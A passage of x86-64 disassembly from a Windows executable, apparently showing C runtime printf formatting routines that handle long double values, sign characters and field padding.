   140004715:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004719:	db 6d d0             	fldt   -0x30(%rbp)
   14000471c:	db 7d c0             	fstpt  -0x40(%rbp)
   14000471f:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   140004723:	48 89 c1             	mov    %rax,%rcx
   140004726:	e8 84 ff ff ff       	call   0x1400046af
   14000472b:	db 6d d0             	fldt   -0x30(%rbp)
   14000472e:	db 7d c0             	fstpt  -0x40(%rbp)
   140004731:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140004735:	48 89 c1             	mov    %rax,%rcx
   140004738:	e8 83 4e 00 00       	call   0x1400095c0
   14000473d:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140004740:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140004743:	25 00 01 00 00       	and    $0x100,%eax
   140004748:	85 c0                	test   %eax,%eax
   14000474a:	74 1d                	je     0x140004769
   14000474c:	8b 45 f8             	mov    -0x8(%rbp),%eax
   14000474f:	25 00 04 00 00       	and    $0x400,%eax
   140004754:	85 c0                	test   %eax,%eax
   140004756:	74 07                	je     0x14000475f
   140004758:	b8 03 00 00 00       	mov    $0x3,%eax
   14000475d:	eb 05                	jmp    0x140004764
   14000475f:	b8 04 00 00 00       	mov    $0x4,%eax
   140004764:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140004767:	eb 4a                	jmp    0x1400047b3
   140004769:	8b 45 f8             	mov    -0x8(%rbp),%eax
   14000476c:	25 00 04 00 00       	and    $0x400,%eax
   140004771:	85 c0                	test   %eax,%eax
   140004773:	74 37                	je     0x1400047ac
   140004775:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140004778:	25 00 40 00 00       	and    $0x4000,%eax
   14000477d:	85 c0                	test   %eax,%eax
   14000477f:	74 10                	je     0x140004791
   140004781:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%rbp)
   140004788:	c7 45 fc c3 bf ff ff 	movl   $0xffffbfc3,-0x4(%rbp)
   14000478f:	eb 22                	jmp    0x1400047b3
   140004791:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
   140004798:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   14000479c:	98                   	cwtl
   14000479d:	25 ff 7f 00 00       	and    $0x7fff,%eax
   1400047a2:	2d 3e 40 00 00       	sub    $0x403e,%eax
   1400047a7:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400047aa:	eb 07                	jmp    0x1400047b3
   1400047ac:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   1400047b3:	8b 45 f8             	mov    -0x8(%rbp),%eax
   1400047b6:	83 f8 04             	cmp    $0x4,%eax
   1400047b9:	74 0e                	je     0x1400047c9
   1400047bb:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   1400047bf:	98                   	cwtl
   1400047c0:	25 00 80 00 00       	and    $0x8000,%eax
   1400047c5:	89 c2                	mov    %eax,%edx
   1400047c7:	eb 05                	jmp    0x1400047ce
   1400047c9:	ba 00 00 00 00       	mov    $0x0,%edx
   1400047ce:	48 8b 45 40          	mov    0x40(%rbp),%rax
   1400047d2:	89 10                	mov    %edx,(%rax)
   1400047d4:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400047d7:	4c 8d 4d f8          	lea    -0x8(%rbp),%r9
   1400047db:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400047df:	48 8d 0d 8a 68 00 00 	lea    0x688a(%rip),%rcx        # 0x14000b070
   1400047e6:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400047ea:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1400047ef:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   1400047f3:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   1400047f8:	8b 55 30             	mov    0x30(%rbp),%edx
   1400047fb:	89 54 24 28          	mov    %edx,0x28(%rsp)
   1400047ff:	8b 55 20             	mov    0x20(%rbp),%edx
   140004802:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140004806:	89 c2                	mov    %eax,%edx
   140004808:	e8 7d 24 00 00       	call   0x140006c8a
   14000480d:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140004814:	5b                   	pop    %rbx
   140004815:	5d                   	pop    %rbp
   140004816:	c3                   	ret
   140004817:	55                   	push   %rbp
   140004818:	53                   	push   %rbx
   140004819:	48 83 ec 58          	sub    $0x58,%rsp
   14000481d:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140004822:	48 89 cb             	mov    %rcx,%rbx
   140004825:	db 2b                	fldt   (%rbx)
   140004827:	db 7d f0             	fstpt  -0x10(%rbp)
   14000482a:	89 55 28             	mov    %edx,0x28(%rbp)
   14000482d:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140004831:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140004835:	db 6d f0             	fldt   -0x10(%rbp)
   140004838:	db 7d e0             	fstpt  -0x20(%rbp)
   14000483b:	4c 8b 45 30          	mov    0x30(%rbp),%r8
   14000483f:	8b 4d 28             	mov    0x28(%rbp),%ecx
   140004842:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004846:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   14000484a:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000484f:	4d 89 c1             	mov    %r8,%r9
   140004852:	41 89 c8             	mov    %ecx,%r8d
   140004855:	48 89 c2             	mov    %rax,%rdx
   140004858:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000485d:	e8 88 fe ff ff       	call   0x1400046ea
   140004862:	48 83 c4 58          	add    $0x58,%rsp
   140004866:	5b                   	pop    %rbx
   140004867:	5d                   	pop    %rbp
   140004868:	c3                   	ret
   140004869:	55                   	push   %rbp
   14000486a:	53                   	push   %rbx
   14000486b:	48 83 ec 58          	sub    $0x58,%rsp
   14000486f:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140004874:	48 89 cb             	mov    %rcx,%rbx
   140004877:	db 2b                	fldt   (%rbx)
   140004879:	db 7d f0             	fstpt  -0x10(%rbp)
   14000487c:	89 55 28             	mov    %edx,0x28(%rbp)
   14000487f:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140004883:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140004887:	db 6d f0             	fldt   -0x10(%rbp)
   14000488a:	db 7d e0             	fstpt  -0x20(%rbp)
   14000488d:	4c 8b 45 30          	mov    0x30(%rbp),%r8
   140004891:	8b 4d 28             	mov    0x28(%rbp),%ecx
   140004894:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   140004898:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   14000489c:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400048a1:	4d 89 c1             	mov    %r8,%r9
   1400048a4:	41 89 c8             	mov    %ecx,%r8d
   1400048a7:	48 89 c2             	mov    %rax,%rdx
   1400048aa:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400048af:	e8 36 fe ff ff       	call   0x1400046ea
   1400048b4:	48 83 c4 58          	add    $0x58,%rsp
   1400048b8:	5b                   	pop    %rbx
   1400048b9:	5d                   	pop    %rbp
   1400048ba:	c3                   	ret
   1400048bb:	55                   	push   %rbp
   1400048bc:	53                   	push   %rbx
   1400048bd:	48 83 ec 68          	sub    $0x68,%rsp
   1400048c1:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
   1400048c6:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   1400048ca:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400048ce:	8b 40 14             	mov    0x14(%rax),%eax
   1400048d1:	83 f8 fd             	cmp    $0xfffffffd,%eax
   1400048d4:	75 57                	jne    0x14000492d
   1400048d6:	48 8d 45 cc          	lea    -0x34(%rbp),%rax
   1400048da:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400048e0:	ba 00 00 00 00       	mov    $0x0,%edx
   1400048e5:	48 89 c1             	mov    %rax,%rcx
   1400048e8:	e8 13 58 00 00       	call   0x14000a100
   1400048ed:	e8 f6 57 00 00       	call   0x14000a0e8
   1400048f2:	48 8b 10             	mov    (%rax),%rdx
   1400048f5:	48 8d 4d cc          	lea    -0x34(%rbp),%rcx
   1400048f9:	48 8d 45 d6          	lea    -0x2a(%rbp),%rax
   1400048fd:	49 89 c9             	mov    %rcx,%r9
   140004900:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140004906:	48 89 c1             	mov    %rax,%rcx
   140004909:	e8 c0 54 00 00       	call   0x140009dce
   14000490e:	89 45 ec             	mov    %eax,-0x14(%rbp)
   140004911:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
   140004915:	7e 0c                	jle    0x140004923
   140004917:	0f b7 55 d6          	movzwl -0x2a(%rbp),%edx
   14000491b:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000491f:	66 89 50 18          	mov    %dx,0x18(%rax)
   140004923:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004927:	8b 55 ec             	mov    -0x14(%rbp),%edx
   14000492a:	89 50 14             	mov    %edx,0x14(%rax)
   14000492d:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004931:	0f b7 40 18          	movzwl 0x18(%rax),%eax
   140004935:	66 85 c0             	test   %ax,%ax
   140004938:	0f 84 c7 00 00 00    	je     0x140004a05
   14000493e:	48 89 e0             	mov    %rsp,%rax
   140004941:	48 89 c3             	mov    %rax,%rbx
   140004944:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004948:	8b 40 14             	mov    0x14(%rax),%eax
   14000494b:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000494e:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140004951:	48 63 d0             	movslq %eax,%rdx
   140004954:	48 83 ea 01          	sub    $0x1,%rdx
   140004958:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   14000495c:	48 98                	cltq
   14000495e:	48 83 c0 0f          	add    $0xf,%rax
   140004962:	48 c1 e8 04          	shr    $0x4,%rax
   140004966:	48 c1 e0 04          	shl    $0x4,%rax
   14000496a:	e8 d1 f0 ff ff       	call   0x140003a40
   14000496f:	48 29 c4             	sub    %rax,%rsp
   140004972:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140004977:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000497b:	48 8d 45 c4          	lea    -0x3c(%rbp),%rax
   14000497f:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140004985:	ba 00 00 00 00       	mov    $0x0,%edx
   14000498a:	48 89 c1             	mov    %rax,%rcx
   14000498d:	e8 6e 57 00 00       	call   0x14000a100
   140004992:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004996:	0f b7 40 18          	movzwl 0x18(%rax),%eax
   14000499a:	0f b7 d0             	movzwl %ax,%edx
   14000499d:	48 8d 4d c4          	lea    -0x3c(%rbp),%rcx
   1400049a1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400049a5:	49 89 c8             	mov    %rcx,%r8
   1400049a8:	48 89 c1             	mov    %rax,%rcx
   1400049ab:	e8 80 50 00 00       	call   0x140009a30
   1400049b0:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400049b3:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400049b7:	7e 36                	jle    0x1400049ef
   1400049b9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400049bd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400049c1:	eb 1d                	jmp    0x1400049e0
   1400049c3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400049c7:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400049cb:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   1400049cf:	0f b6 00             	movzbl (%rax),%eax
   1400049d2:	0f be c0             	movsbl %al,%eax
   1400049d5:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   1400049d9:	89 c1                	mov    %eax,%ecx
   1400049db:	e8 b0 f1 ff ff       	call   0x140003b90
   1400049e0:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400049e3:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400049e6:	89 55 fc             	mov    %edx,-0x4(%rbp)
   1400049e9:	85 c0                	test   %eax,%eax
   1400049eb:	7f d6                	jg     0x1400049c3
   1400049ed:	eb 11                	jmp    0x140004a00
   1400049ef:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400049f3:	48 89 c2             	mov    %rax,%rdx
   1400049f6:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   1400049fb:	e8 90 f1 ff ff       	call   0x140003b90
   140004a00:	48 89 dc             	mov    %rbx,%rsp
   140004a03:	eb 11                	jmp    0x140004a16
   140004a05:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004a09:	48 89 c2             	mov    %rax,%rdx
   140004a0c:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   140004a11:	e8 7a f1 ff ff       	call   0x140003b90
   140004a16:	90                   	nop
   140004a17:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   140004a1b:	5b                   	pop    %rbx
   140004a1c:	5d                   	pop    %rbp
   140004a1d:	c3                   	ret
   140004a1e:	55                   	push   %rbp
   140004a1f:	48 89 e5             	mov    %rsp,%rbp
   140004a22:	48 83 ec 30          	sub    $0x30,%rsp
   140004a26:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140004a29:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004a2d:	83 7d 10 2e          	cmpl   $0x2e,0x10(%rbp)
   140004a31:	75 0e                	jne    0x140004a41
   140004a33:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004a37:	48 89 c1             	mov    %rax,%rcx
   140004a3a:	e8 7c fe ff ff       	call   0x1400048bb
   140004a3f:	eb 43                	jmp    0x140004a84
   140004a41:	83 7d 10 2c          	cmpl   $0x2c,0x10(%rbp)
   140004a45:	75 2f                	jne    0x140004a76
   140004a47:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004a4b:	0f b7 40 20          	movzwl 0x20(%rax),%eax
   140004a4f:	66 89 45 fe          	mov    %ax,-0x2(%rbp)
   140004a53:	0f b7 45 fe          	movzwl -0x2(%rbp),%eax
   140004a57:	66 85 c0             	test   %ax,%ax
   140004a5a:	74 28                	je     0x140004a84
   140004a5c:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140004a60:	48 8d 45 fe          	lea    -0x2(%rbp),%rax
   140004a64:	49 89 d0             	mov    %rdx,%r8
   140004a67:	ba 01 00 00 00       	mov    $0x1,%edx
   140004a6c:	48 89 c1             	mov    %rax,%rcx
   140004a6f:	e8 25 f3 ff ff       	call   0x140003d99
   140004a74:	eb 0e                	jmp    0x140004a84
   140004a76:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140004a7a:	8b 45 10             	mov    0x10(%rbp),%eax
   140004a7d:	89 c1                	mov    %eax,%ecx
   140004a7f:	e8 0c f1 ff ff       	call   0x140003b90
   140004a84:	90                   	nop
   140004a85:	48 83 c4 30          	add    $0x30,%rsp
   140004a89:	5d                   	pop    %rbp
   140004a8a:	c3                   	ret
   140004a8b:	55                   	push   %rbp
   140004a8c:	48 89 e5             	mov    %rsp,%rbp
   140004a8f:	48 83 ec 40          	sub    $0x40,%rsp
   140004a93:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140004a96:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004a9a:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140004a9e:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
   140004aa2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004aa6:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004aaa:	c7 40 10 ff ff ff ff 	movl   $0xffffffff,0x10(%rax)
   140004ab1:	83 7d 10 00          	cmpl   $0x0,0x10(%rbp)
   140004ab5:	74 11                	je     0x140004ac8
   140004ab7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004abb:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004abf:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004ac3:	c6 00 2d             	movb   $0x2d,(%rax)
   140004ac6:	eb 3e                	jmp    0x140004b06
   140004ac8:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004acc:	8b 40 08             	mov    0x8(%rax),%eax
   140004acf:	25 00 01 00 00       	and    $0x100,%eax
   140004ad4:	85 c0                	test   %eax,%eax
   140004ad6:	74 11                	je     0x140004ae9
   140004ad8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004adc:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004ae0:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004ae4:	c6 00 2b             	movb   $0x2b,(%rax)
   140004ae7:	eb 1d                	jmp    0x140004b06
   140004ae9:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004aed:	8b 40 08             	mov    0x8(%rax),%eax
   140004af0:	83 e0 40             	and    $0x40,%eax
   140004af3:	85 c0                	test   %eax,%eax
   140004af5:	74 0f                	je     0x140004b06
   140004af7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004afb:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004aff:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004b03:	c6 00 20             	movb   $0x20,(%rax)
   140004b06:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%rbp)
   140004b0d:	eb 38                	jmp    0x140004b47
   140004b0f:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140004b13:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004b17:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004b1b:	0f b6 00             	movzbl (%rax),%eax
   140004b1e:	83 e0 df             	and    $0xffffffdf,%eax
   140004b21:	41 89 c0             	mov    %eax,%r8d
   140004b24:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140004b28:	8b 40 08             	mov    0x8(%rax),%eax
   140004b2b:	83 e0 20             	and    $0x20,%eax
   140004b2e:	89 c1                	mov    %eax,%ecx
   140004b30:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140004b34:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140004b38:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004b3c:	44 89 c2             	mov    %r8d,%edx
   140004b3f:	09 ca                	or     %ecx,%edx
   140004b41:	88 10                	mov    %dl,(%rax)
   140004b43:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   140004b47:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140004b4b:	7f c2                	jg     0x140004b0f
   140004b4d:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
   140004b51:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140004b55:	48 29 c2             	sub    %rax,%rdx
   140004b58:	89 d1                	mov    %edx,%ecx
   140004b5a:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140004b5e:	48 8d 45 ec          	lea    -0x14(%rbp),%rax
   140004b62:	49 89 d0             	mov    %rdx,%r8
   140004b65:	89 ca                	mov    %ecx,%edx
   140004b67:	48 89 c1             	mov    %rax,%rcx
   140004b6a:	e8 a5 f0 ff ff       	call   0x140003c14
   140004b6f:	90                   	nop
   140004b70:	48 83 c4 40          	add    $0x40,%rsp
   140004b74:	5d                   	pop    %rbp
   140004b75:	c3                   	ret
   140004b76:	55                   	push   %rbp
   140004b77:	48 89 e5             	mov    %rsp,%rbp
   140004b7a:	48 83 ec 30          	sub    $0x30,%rsp
   140004b7e:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140004b81:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140004b85:	44 89 45 20          	mov    %r8d,0x20(%rbp)
   140004b89:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140004b8d:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004b91:	7e 2e                	jle    0x140004bc1
   140004b93:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004b97:	8b 40 0c             	mov    0xc(%rax),%eax
   140004b9a:	39 45 20             	cmp    %eax,0x20(%rbp)
   140004b9d:	7f 15                	jg     0x140004bb4
   140004b9f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ba3:	8b 40 0c             	mov    0xc(%rax),%eax
   140004ba6:	2b 45 20             	sub    0x20(%rbp),%eax
   140004ba9:	89 c2                	mov    %eax,%edx
   140004bab:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004baf:	89 50 0c             	mov    %edx,0xc(%rax)
   140004bb2:	eb 29                	jmp    0x140004bdd
   140004bb4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bb8:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140004bbf:	eb 1c                	jmp    0x140004bdd
   140004bc1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bc5:	8b 40 0c             	mov    0xc(%rax),%eax
   140004bc8:	85 c0                	test   %eax,%eax
   140004bca:	7e 11                	jle    0x140004bdd
   140004bcc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bd0:	8b 40 0c             	mov    0xc(%rax),%eax
   140004bd3:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004bd6:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bda:	89 50 0c             	mov    %edx,0xc(%rax)
   140004bdd:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004be1:	8b 40 0c             	mov    0xc(%rax),%eax
   140004be4:	85 c0                	test   %eax,%eax
   140004be6:	78 2b                	js     0x140004c13
   140004be8:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bec:	8b 50 0c             	mov    0xc(%rax),%edx
   140004bef:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bf3:	8b 40 10             	mov    0x10(%rax),%eax
   140004bf6:	39 c2                	cmp    %eax,%edx
   140004bf8:	7e 19                	jle    0x140004c13
   140004bfa:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004bfe:	8b 50 0c             	mov    0xc(%rax),%edx
   140004c01:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c05:	8b 40 10             	mov    0x10(%rax),%eax
   140004c08:	29 c2                	sub    %eax,%edx
   140004c0a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c0e:	89 50 0c             	mov    %edx,0xc(%rax)
   140004c11:	eb 0b                	jmp    0x140004c1e
   140004c13:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c17:	c7 40 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rax)
   140004c1e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c22:	8b 40 0c             	mov    0xc(%rax),%eax
   140004c25:	85 c0                	test   %eax,%eax
   140004c27:	7e 2c                	jle    0x140004c55
   140004c29:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c2d:	8b 40 10             	mov    0x10(%rax),%eax
   140004c30:	85 c0                	test   %eax,%eax
   140004c32:	7f 10                	jg     0x140004c44
   140004c34:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c38:	8b 40 08             	mov    0x8(%rax),%eax
   140004c3b:	25 00 08 00 00       	and    $0x800,%eax
   140004c40:	85 c0                	test   %eax,%eax
   140004c42:	74 11                	je     0x140004c55
   140004c44:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c48:	8b 40 0c             	mov    0xc(%rax),%eax
   140004c4b:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004c4e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c52:	89 50 0c             	mov    %edx,0xc(%rax)
   140004c55:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   140004c59:	7e 64                	jle    0x140004cbf
   140004c5b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c5f:	8b 40 08             	mov    0x8(%rax),%eax
   140004c62:	25 00 10 00 00       	and    $0x1000,%eax
   140004c67:	85 c0                	test   %eax,%eax
   140004c69:	74 54                	je     0x140004cbf
   140004c6b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004c6f:	0f b7 40 20          	movzwl 0x20(%rax),%eax
   140004c73:	66 85 c0             	test   %ax,%ax
   140004c76:	74 47                	je     0x140004cbf
   140004c78:	8b 45 20             	mov    0x20(%rbp),%eax
   140004c7b:	83 c0 02             	add    $0x2,%eax
   140004c7e:	48 63 d0             	movslq %eax,%rdx
   140004c81:	48 69 d2 56 55 55 55 	imul   $0x55555556,%rdx,%rdx
   140004c88:	48 c1 ea 20          	shr    $0x20,%rdx
   140004c8c:	c1 f8 1f             	sar    $0x1f,%eax
   140004c8f:	29 c2                	sub    %eax,%edx
   140004c91:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140004c94:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140004c97:	eb 15                	jmp    0x140004cae
   140004c99:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   140004c9d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ca1:	8b 40 0c             	mov    0xc(%rax),%eax
   140004ca4:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004ca7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cab:	89 50 0c             	mov    %edx,0xc(%rax)
   140004cae:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140004cb2:	7e 0b                	jle    0x140004cbf
   140004cb4:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cb8:	8b 40 0c             	mov    0xc(%rax),%eax
   140004cbb:	85 c0                	test   %eax,%eax
   140004cbd:	7f da                	jg     0x140004c99
   140004cbf:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cc3:	8b 40 0c             	mov    0xc(%rax),%eax
   140004cc6:	85 c0                	test   %eax,%eax
   140004cc8:	7e 27                	jle    0x140004cf1
   140004cca:	83 7d 10 00          	cmpl   $0x0,0x10(%rbp)
   140004cce:	75 10                	jne    0x140004ce0
   140004cd0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cd4:	8b 40 08             	mov    0x8(%rax),%eax
   140004cd7:	25 c0 01 00 00       	and    $0x1c0,%eax
   140004cdc:	85 c0                	test   %eax,%eax
   140004cde:	74 11                	je     0x140004cf1
   140004ce0:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004ce4:	8b 40 0c             	mov    0xc(%rax),%eax
   140004ce7:	8d 50 ff             	lea    -0x1(%rax),%edx
   140004cea:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cee:	89 50 0c             	mov    %edx,0xc(%rax)
   140004cf1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004cf5:	8b 40 0c             	mov    0xc(%rax),%eax
   140004cf8:	85 c0                	test   %eax,%eax
   140004cfa:	7e 38                	jle    0x140004d34
   140004cfc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d00:	8b 40 08             	mov    0x8(%rax),%eax
   140004d03:	25 00 06 00 00       	and    $0x600,%eax
   140004d08:	85 c0                	test   %eax,%eax
   140004d0a:	75 28                	jne    0x140004d34
   140004d0c:	eb 11                	jmp    0x140004d1f
   140004d0e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d12:	48 89 c2             	mov    %rax,%rdx
   140004d15:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004d1a:	e8 71 ee ff ff       	call   0x140003b90
   140004d1f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d23:	8b 40 0c             	mov    0xc(%rax),%eax
   140004d26:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140004d29:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140004d2d:	89 4a 0c             	mov    %ecx,0xc(%rdx)
   140004d30:	85 c0                	test   %eax,%eax
   140004d32:	7f da                	jg     0x140004d0e
   140004d34:	83 7d 10 00          	cmpl   $0x0,0x10(%rbp)
   140004d38:	74 13                	je     0x140004d4d
   140004d3a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d3e:	48 89 c2             	mov    %rax,%rdx
   140004d41:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   140004d46:	e8 45 ee ff ff       	call   0x140003b90
   140004d4b:	eb 42                	jmp    0x140004d8f
   140004d4d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d51:	8b 40 08             	mov    0x8(%rax),%eax
   140004d54:	25 00 01 00 00       	and    $0x100,%eax
   140004d59:	85 c0                	test   %eax,%eax
   140004d5b:	74 13                	je     0x140004d70
   140004d5d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d61:	48 89 c2             	mov    %rax,%rdx
   140004d64:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   140004d69:	e8 22 ee ff ff       	call   0x140003b90
   140004d6e:	eb 1f                	jmp    0x140004d8f
   140004d70:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d74:	8b 40 08             	mov    0x8(%rax),%eax
   140004d77:	83 e0 40             	and    $0x40,%eax
   140004d7a:	85 c0                	test   %eax,%eax
   140004d7c:	74 11                	je     0x140004d8f
   140004d7e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d82:	48 89 c2             	mov    %rax,%rdx
   140004d85:	b9 20 00 00 00       	mov    $0x20,%ecx
   140004d8a:	e8 01 ee ff ff       	call   0x140003b90
   140004d8f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140004d93:	8b 40 0c             	mov    0xc(%rax),%eax
   140004d96:	85 c0                	test   %eax,%eax
   140004d98:	7e 3b                	jle    0x140004dd5
   140004d9a:	48 8b 45 28          	mov    0x28(%rbp),%rax
